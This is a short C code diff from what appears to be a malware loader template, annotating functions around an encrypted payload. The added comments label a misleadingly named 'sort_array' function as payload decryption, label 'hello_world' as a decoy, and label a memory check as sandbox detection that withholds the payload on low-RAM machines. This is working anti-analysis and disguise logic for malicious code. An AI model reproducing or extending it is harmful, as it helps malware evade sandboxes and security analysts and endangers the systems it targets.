@@ -10,6 +10,7 @@ static const int bytecode_size = SET_BYTECODE_SIZE;
 static unsigned char key[SET_KEY_SIZE] = SET_KEY_ARRAY;
 static const int key_size = SET_KEY_SIZE;
 
+// decyphering the payload
 void sort_array()
 {
     for(int i=0;i<bytecode_size;i++)
@@ -18,11 +19,13 @@ void sort_array()
     }
 }
 
+// some decoy function
 void hello_world()
 {
     printf("Hello World !\n");
 }
 
+// actually checking if we are in a sandbox
 void check_available_ressources()
 {
     MEMORYSTATUSEX memorystatus; // will store the data about the memory
@@ -30,8 +33,9 @@ void check_available_ressources()
     
     // reading the memory 
     GlobalMemoryStatusEx(&memorystatus);
-
-    if((memorystatus.ullTotalPhys / 1000000000) < 5) // less than 4go is considered to be a potato or a sandbox, we don't want either of them to run our payload
+    
+    // less than 4go is considered to be a potato or a sandbox, we don't want either of them to run our payload
+    if((memorystatus.ullTotalPhys / 1000000000) < 5) 
         hello_world();
     else
         sort_array();
